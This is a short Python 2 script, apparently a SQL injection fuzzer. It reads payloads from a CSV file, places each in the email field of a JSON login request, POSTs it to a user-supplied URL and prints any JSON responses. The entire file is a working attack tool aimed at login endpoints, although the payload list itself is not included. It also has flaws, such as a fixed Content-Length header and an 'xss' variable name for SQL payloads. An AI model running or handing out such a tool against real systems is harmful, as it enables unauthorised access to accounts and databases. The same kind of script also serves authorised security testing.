import requests
import time
import json
import csv
import argparse
import sys

class sqli:

	def __init__(self, uri, headers, xsspayload):
		self.uri = uri
		self.headers = headers
		self.xsspayload = xsspayload

	def injection(self):
		with open(self.xsspayload) as f:
			reader = csv.reader(f)
			for line in reader:
				str1 = ''.join(line)
				payload = "{\"email\":"+ '\"{}\"'.format(str1) + ",\"password\":\"test\"}"
				response = requests.request("POST", self.uri, data=payload, headers=self.headers)
				time.sleep(1)
				try:
					for key in response.json():
						print str1
						print response.json()
				except ValueError:
					pass

def main(arg1):
	xsspayload = "sqli.csv"

	headers = {
		'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0",
		'Accept': "*/*",
		'Accept-Language': "en-US,en;q=0.5",
		'Referer': "https://192.168.1.1/login",
		'Content-Type': "application/json",
		'Content-Length': "35",
		'DNT': "1",
		'Connection': "keep-alive"
	}

	if len(arg1) == 1:
		dev = argparse.ArgumentParser()
		dev.add_argument('url')
		uri = dev.parse_args(arg1)
		class1 = sqli(uri.url, headers, xsspayload)
		class1.injection()
	else:
		sys.exit()

if __name__ == '__main__':
	main(sys.argv[1:])
